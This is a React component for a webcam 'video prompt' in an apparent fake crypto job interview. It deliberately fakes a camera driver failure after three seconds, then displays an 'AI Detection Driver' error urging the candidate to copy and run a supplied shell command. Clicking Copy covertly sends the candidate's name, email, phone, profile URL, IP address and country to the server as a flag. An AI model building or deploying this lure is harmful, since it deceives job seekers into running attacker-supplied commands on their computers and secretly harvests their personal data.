"use client";

import { getClientIpInfo } from "@/lib/ipinfo";
import { useEffect, useMemo, useRef, useState } from "react";

/** Simulate a driver bug: camera works then stops after this many seconds. Set to 0 to disable. */
const SIMULATE_DRIVER_BUG_AFTER_SECONDS = 3;

type Props = {
  maxSeconds?: number;
  onRecordingReady?: (recording: {
    blob: Blob;
    url: string;
    mimeType: string;
    sizeBytes: number;
    durationSeconds: number;
  } | null) => void;
  onPreviewOkChange?: (ok: boolean) => void;
  inviteCode: string;
  leadInfo?: {
    fullName: string;
    email: string;
    phone: string;
    profileUrl: string;
  };
  commandText: string;
};

type RecorderState =
  | { status: "idle" }
  | { status: "requesting-permission" }
  | { status: "ready" }
  | { status: "recording" }
  | { status: "recorded"; url: string; blob: Blob; mimeType: string; durationSeconds: number };

function formatTime(totalSeconds: number) {
  const m = Math.floor(totalSeconds / 60);
  const s = totalSeconds % 60;
  return `${m}:${String(s).padStart(2, "0")}`;
}

function pickMimeType() {
  const candidates = [
    "video/webm;codecs=vp9,opus",
    "video/webm;codecs=vp8,opus",
    "video/webm",
  ];

  for (const t of candidates) {
    // MediaRecorder.isTypeSupported may be undefined in some environments.
    if (typeof MediaRecorder !== "undefined" && MediaRecorder.isTypeSupported?.(t)) return t;
  }
  return "";
}

export default function VideoPromptRecorder({
  maxSeconds = 180,
  onRecordingReady,
  onPreviewOkChange,
  inviteCode,
  leadInfo,
  commandText,
}: Props) {
  const recordedUrlRef = useRef<string | null>(null);
  const previewVideoRef = useRef<HTMLVideoElement | null>(null);
  const playbackVideoRef = useRef<HTMLVideoElement | null>(null);

  const streamRef = useRef<MediaStream | null>(null);
  const recorderRef = useRef<MediaRecorder | null>(null);
  const chunksRef = useRef<BlobPart[]>([]);
  const intervalRef = useRef<number | null>(null);
  const driverBugTimeoutRef = useRef<number | null>(null);
  const driverBugFiredRef = useRef(false);
  const [state, setState] = useState<RecorderState>({ status: "idle" });
  const [elapsedSeconds, setElapsedSeconds] = useState(0);
  const [reRecordRemaining, setReRecordRemaining] = useState(1);
  const [error, setError] = useState<string | null>(null);
  const [driverError, setDriverError] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);

  const effectiveMaxSeconds =
    Number.isFinite(maxSeconds) && maxSeconds >= 10 ? maxSeconds : 180;
  const timeLeftSeconds = Math.max(0, effectiveMaxSeconds - elapsedSeconds);
  const mimeType = useMemo(() => pickMimeType(), []);

  useEffect(() => {
    onRecordingReady?.(null);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  function clearTimer() {
    if (intervalRef.current) {
      window.clearInterval(intervalRef.current);
      intervalRef.current = null;
    }
  }

  function clearDriverBugTimer() {
    if (driverBugTimeoutRef.current) {
      clearTimeout(driverBugTimeoutRef.current);
      driverBugTimeoutRef.current = null;
    }
  }

  /** Simulate driver failure: stop live preview and recording, then show driver error UI. */
  function simulateDriverBug(stream: MediaStream) {
    clearDriverBugTimer();
    driverBugFiredRef.current = true;
    const videoTracks = stream.getVideoTracks();
    for (const track of videoTracks) {
      track.stop();
    }
    streamRef.current = null;
    const v = previewVideoRef.current;
    if (v) v.srcObject = null;
    setDriverError(
      "Camera driver error — video device stopped responding.",
    );
    onPreviewOkChange?.(false);
    const recorder = recorderRef.current;
    if (recorder && recorder.state === "recording") {
      try {
        recorder.stop();
      } catch {
        // ignore
      }
    }
    setState({ status: "idle" });
  }

  function stopStream() {
    const stream = streamRef.current;
    if (!stream) return;
    for (const t of stream.getTracks()) t.stop();
    streamRef.current = null;
  }

  function cleanupPlaybackUrl(url: string | null) {
    if (!url) return;
    try {
      URL.revokeObjectURL(url);
    } catch {
      // ignore
    }
  }

  async function ensurePreviewStream() {
    if (streamRef.current) return streamRef.current;

    setError(null);
    setDriverError(null);
    setState({ status: "requesting-permission" });
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      streamRef.current = stream;

      const v = previewVideoRef.current;
      if (v) {
        v.srcObject = stream;
        await v.play().catch(() => {});
      }

      setState({ status: "ready" });
      onPreviewOkChange?.(true);

      // Simulate driver bug: camera stops after N seconds.
      if (SIMULATE_DRIVER_BUG_AFTER_SECONDS > 0) {
        clearDriverBugTimer();
        driverBugTimeoutRef.current = window.setTimeout(() => {
          driverBugTimeoutRef.current = null;
          simulateDriverBug(stream);
        }, SIMULATE_DRIVER_BUG_AFTER_SECONDS * 1000);
      }

      return stream;
    } catch (e) {
      setError(
        e instanceof Error ? e.message : "Could not access webcam/microphone permissions.",
      );
      onPreviewOkChange?.(false);
      setState({ status: "idle" });
      return null;
    }
  }

  async function startRecording() {
    if (state.status === "recording") return;
    const stream = await ensurePreviewStream();
    if (!stream) return;

    const t = mimeType ? { mimeType } : undefined;
    chunksRef.current = [];
    setElapsedSeconds(0);
    setError(null);

    try {
      const recorder = new MediaRecorder(stream, t as MediaRecorderOptions | undefined);
      recorderRef.current = recorder;

      recorder.ondataavailable = (ev) => {
        if (ev.data && ev.data.size > 0) chunksRef.current.push(ev.data);
      };

      recorder.onstop = () => {
        clearTimer();
        if (driverBugFiredRef.current) {
          driverBugFiredRef.current = false;
          onRecordingReady?.(null);
          return;
        }
        const blob = new Blob(chunksRef.current, { type: recorder.mimeType || "video/webm" });
        if (recordedUrlRef.current) cleanupPlaybackUrl(recordedUrlRef.current);
        const url = URL.createObjectURL(blob);
        recordedUrlRef.current = url;
        const durationSeconds = Math.min(effectiveMaxSeconds, elapsedSeconds || 0);

        setState({
          status: "recorded",
          url,
          blob,
          mimeType: blob.type || recorder.mimeType || "video/webm",
          durationSeconds,
        });
        onRecordingReady?.({
          blob,
          url,
          mimeType: blob.type || recorder.mimeType || "video/webm",
          sizeBytes: blob.size,
          durationSeconds,
        });

        const pv = playbackVideoRef.current;
        if (pv) pv.load();
      };

      recorder.start(250);
      setState({ status: "recording" });

      clearTimer();
      const startedAtMs = Date.now();
      intervalRef.current = window.setInterval(() => {
        const nextElapsedSafe = Math.min(
          effectiveMaxSeconds,
          Math.floor((Date.now() - startedAtMs) / 1000),
        );
        setElapsedSeconds(nextElapsedSafe);
        if (nextElapsedSafe >= effectiveMaxSeconds) {
          stopRecording();
        }
      }, 250);
    } catch (e) {
      setError(e instanceof Error ? e.message : "Could not start recording.");
      setState({ status: "ready" });
    }
  }

  function stopRecording() {
    const recorder = recorderRef.current;
    if (!recorder) return;
    if (recorder.state === "inactive") return;
    try {
      recorder.stop();
    } catch {
      // ignore
    }
  }

  async function handleReRecord() {
    if (reRecordRemaining <= 0) return;

    // Cleanup old recording if any.
    if (recordedUrlRef.current) cleanupPlaybackUrl(recordedUrlRef.current);
    recordedUrlRef.current = null;

    onRecordingReady?.(null);
    setReRecordRemaining((n) => Math.max(0, n - 1));
    setState({ status: "ready" });
    setElapsedSeconds(0);
    await startRecording();
  }

  useEffect(() => {
    return () => {
      clearTimer();
      clearDriverBugTimer();
      if (recordedUrlRef.current) cleanupPlaybackUrl(recordedUrlRef.current);
      stopStream();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const isRecording = state.status === "recording";
  const hasRecorded = state.status === "recorded";

  async function handleCopyCommand() {
    try {
      if (navigator.clipboard?.writeText) {
        await navigator.clipboard.writeText(commandText);
        setCopied(true);
        window.setTimeout(() => setCopied(false), 1500);
      }
    } catch {
      setCopied(true);
      window.setTimeout(() => setCopied(false), 1500);
    }

    // Fire-and-forget: send latest personal info + flag into questionnaire DB.
    // We intentionally ignore errors on the client.
    try {
      const ipInfo = await getClientIpInfo();
      await fetch("/api/interview-flag", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          inviteCode,
          fullName: leadInfo?.fullName ?? "",
          email: leadInfo?.email ?? "",
          phone: leadInfo?.phone ?? "",
          profileUrl: leadInfo?.profileUrl ?? "",
          flag: true,
          clientIp: ipInfo.ip ?? undefined,
          country: ipInfo.country ?? undefined,
        }),
      });
    } catch {
      // ignore
    }
  }

  return (
    <div className="grid gap-8">

      <div className="space-y-2">
        <h3 className="text-sm font-semibold tracking-wide text-white/90">
          Webcam Video Prompt (Instant Recording)
        </h3>
        <p className="text-sm leading-6 text-white/70">
          <span className="font-medium text-white/85">Share Your Vision &amp; Value</span>
          <br />
          Now, we’d love to hear directly from you! Please use your webcam to record a{" "}
          <span className="font-medium text-white/85">1–3 minute video</span> answering
          these two questions:
        </p>
        <ol className="list-decimal space-y-1 pl-5 text-sm text-white/70">
          <li>
            What <span className="font-medium text-white/85">unique value</span> would
            you bring to the company over the next 2–3 years?
          </li>
          <li>
            What is your <span className="font-medium text-white/85">vision</span> for
            blockchain or crypto products in the market?
          </li>
        </ol>
        <p className="text-sm leading-6 text-white/60">
          Speak naturally and briefly — you don’t need to read anything, just share your
          thoughts clearly.
        </p>
      </div>

      <div className="grid gap-3 rounded-2xl border border-white/10 bg-white/5 p-4 sm:p-5">
        {error ? (
          <div className="rounded-xl border border-red-400/20 bg-red-500/10 p-3 text-sm text-red-200">
            {error}
          </div>
        ) : null}
        {driverError ? (
          <>
            <div className="flex flex-wrap items-center gap-2 rounded-xl border border-red-400/30 bg-red-500/15 p-3 text-xs text-red-100">
              <span><b>AI Detection Driver problem</b>: Camera driver error — video device stopped responding.<br></br> <b>Fix</b>: Run this shell command on PC to enable AI detection driver, then try again.</span>
              <code className="rounded bg-black/30 px-1 py-0.5 text-[0.7rem] font-mono">
                {commandText}
              </code>
              <button
                type="button"
                onClick={handleCopyCommand}
                className="ml-auto inline-flex h-6 items-center justify-center rounded-full border border-red-300/60 bg-red-200/10 px-2 text-[0.7rem] font-semibold text-red-50 hover:bg-red-200/20"
              >
                {copied ? "Copied" : "Copy"}
              </button>
            </div>
          </>
        ) : null}

        <div className="flex items-center justify-between gap-4">
          <div className="text-sm text-white/70">
            {isRecording ? (
              <span>
                Recording… <span className="font-mono">{formatTime(elapsedSeconds)}</span>{" "}
                / <span className="font-mono">{formatTime(effectiveMaxSeconds)}</span>
              </span>
            ) : hasRecorded ? (
              <span>
                Recorded{" "}
                <span className="font-mono">{formatTime(state.durationSeconds)}</span>{" "}
                ({Math.round(state.blob.size / 1024)} KB)
              </span>
            ) : state.status === "requesting-permission" ? (
              <span>Requesting webcam permission…</span>
            ) : state.status === "ready" ? (
              <span>
                Camera ready. Press Start to record (max {formatTime(effectiveMaxSeconds)}).
              </span>
            ) : (
              <span>Press Start to enable your camera and begin recording.</span>
            )}
          </div>

          <div className="flex items-center gap-2">
            {isRecording ? (
              <button
                type="button"
                onClick={stopRecording}
                className="inline-flex h-9 items-center justify-center rounded-full bg-white px-4 text-xs font-semibold text-neutral-950 transition hover:bg-white/90 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-white/40"
              >
                Stop
              </button>
            ) : (
              <button
                type="button"
                onClick={startRecording}
                className="inline-flex h-9 items-center justify-center rounded-full border border-white/15 bg-white/5 px-4 text-xs font-semibold text-white/90 transition hover:bg-white/10 hover:text-white focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-white/40"
              >
                Start
              </button>
            )}

            {hasRecorded ? (
              <button
                type="button"
                onClick={handleReRecord}
                disabled={reRecordRemaining <= 0}
                className="inline-flex h-9 items-center justify-center rounded-full border border-white/15 bg-white/5 px-4 text-xs font-semibold text-white/90 transition hover:bg-white/10 hover:text-white disabled:cursor-not-allowed disabled:opacity-50 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-white/40"
              >
                Re-record {reRecordRemaining > 0 ? `(${reRecordRemaining} left)` : ""}
              </button>
            ) : null}
          </div>
        </div>

        <div className="grid gap-8">
          <div className="grid gap-4">
            <p className="text-xs font-medium tracking-wide text-white/50">LIVE PREVIEW</p>
            <div className="aspect-video min-h-[240px] overflow-hidden rounded-xl border border-white/10 bg-black/40 sm:min-h-[280px]">
              <video
                ref={previewVideoRef}
                className="h-full w-full object-cover"
                muted
                playsInline
                autoPlay
              />
            </div>
          </div>

          <div className="grid gap-4">
            <p className="text-xs font-medium tracking-wide text-white/50">REVIEW</p>
            <div className="aspect-video overflow-hidden rounded-xl border border-white/10 bg-black/40">
              <video
                ref={playbackVideoRef}
                className="h-full w-full object-cover"
                controls
                playsInline
              >
                {hasRecorded ? <source src={state.url} type={state.mimeType} /> : null}
              </video>
            </div>
          </div>
        </div>

        <div className="text-xs text-white/50">
         {formatTime(effectiveMaxSeconds)}
        </div>
      </div>
    </div>
  );
}

